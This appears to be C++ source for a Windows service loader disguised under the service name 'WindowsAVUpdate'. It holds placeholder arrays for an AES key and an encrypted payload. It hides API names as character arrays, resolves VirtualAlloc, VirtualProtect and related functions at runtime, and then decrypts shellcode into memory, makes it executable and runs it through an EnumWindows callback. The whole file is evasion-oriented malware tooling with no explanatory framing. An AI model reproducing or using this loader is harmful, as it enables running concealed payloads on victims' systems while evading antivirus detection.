#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <strsafe.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <time.h>
using namespace std;

// WINAPI function pointers
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAlocationType, DWORD flProtect);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pGetModuleHandle)(LPCSTR lpModuleName);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID* destination, VOID* source, SIZE_T size);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam);
typedef HMODULE(WINAPI* pLoadLibrary)(LPCSTR lpLibFileName);

BYTE payload_key[] = { <<<PAYLOADKEY>>> };
BYTE payload[] = { <<<PAYLOAD>>> };

unsigned char kernel32_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char ntdll_str[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char user32_str[] = { 'u','s','e','r','3','2','.','d','l','l', 0x0 }; 
unsigned char virtualalloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 }; 
unsigned char getprocaddress_str[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 }; 
unsigned char getmodulehandleA_str[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0};
unsigned char rtlmovememory_str[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
unsigned char virtualprotect_str[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
unsigned char enumwindows_str[] = { 'E', 'n', 'u', 'm', 'W', 'i', 'n', 'd', 'o', 'w', 's', 0x00 };
unsigned char loadlibrary_str[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};


SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler (DWORD);
DWORD WINAPI ServiceWorkerThread (LPVOID lpParam);

#define SERVICE_NAME  (LPSTR)"WindowsAVUpdate"

int main (int argc, TCHAR *argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] = 
    {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher (ServiceTable) == FALSE)
    {
       return GetLastError ();
    }

    return 0;
}

VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv)
{
    DWORD Status = E_FAIL;

    g_StatusHandle = RegisterServiceCtrlHandler (SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL) 
    {
        //goto EXIT;
    }

    // Tell the service controller we are starting
    ZeroMemory (&g_ServiceStatus, sizeof (g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    

    /* 
     * Perform tasks neccesary to start the service here
     */
    
    // Create stop event to wait on later.
    g_ServiceStopEvent = CreateEvent (NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) 
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
	    
        //goto EXIT; 
    }    

    // Tell the service controller we are started
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus); 
    
    // Start the thread that will perform the main task of the service
    HANDLE hThread = CreateThread (NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    // Wait until our worker thread exits effectively signaling that the service needs to stop
    WaitForSingleObject (hThread, INFINITE);
    
    CloseHandle (g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    {

    }
    
    //EXIT:
    //OutputDebugString(_T("My Sample Service: ServiceMain: Exit"));

    return;
}

VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)
{
    switch (CtrlCode) 
	{
     case SERVICE_CONTROL_STOP :

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
           break;

        /* 
         * Perform tasks neccesary to stop the service here 
         */
        
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
		
        // This will signal the worker thread to start shutting down
        SetEvent (g_ServiceStopEvent);

        break;

     default:
         break;
    }

}

VOID AESDecrypt(BYTE* payload, DWORD payload_len, BYTE* key, size_t keylen)
{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}

DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
{
    LPVOID exec_mem;
    DWORD oldprotect = 0;

    // get the memory address of the GetProcAddress function
	pGetProcAddress cGetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getprocaddress_str);

	// get the memory address of the GetModuleHandle function
	pGetModuleHandle cGetModuleHandle = (pGetModuleHandle)cGetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getmodulehandleA_str);

	// get the memory address of the VirutalAlloc function
	pVirtualAlloc cVirtualAlloc = (pVirtualAlloc)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualalloc_str);
	exec_mem = cVirtualAlloc(0, (size_t)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// get the memory address of the RtlMoveMemory function
	pRtlMoveMemory cRtlMoveMemory = (pRtlMoveMemory)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)rtlmovememory_str);
	cRtlMoveMemory(exec_mem, payload, (size_t)sizeof(payload));

	// decrypt the payload
	AESDecrypt((LPBYTE)exec_mem, (size_t)sizeof(payload), payload_key, (size_t)sizeof(payload_key));

	// get the memory address of the RtlMoveMemory function
	pVirtualProtect cVirtualProtect = (pVirtualProtect)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualprotect_str);
	cVirtualProtect(exec_mem, (size_t)sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

	// get the memory address of the LoadLibraryA function - then load user32.dll
	pLoadLibrary cLoadLibrary = (pLoadLibrary)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)loadlibrary_str);
	cLoadLibrary((LPCSTR)user32_str);

	// get the memory address of the EnumWindows function - then call
	pEnumWindows cEnumWindows = (pEnumWindows)cGetProcAddress(cGetModuleHandle((LPCSTR)user32_str), (LPCSTR)enumwindows_str);
	cEnumWindows((WNDENUMPROC)exec_mem, 0);

    return ERROR_SUCCESS;
}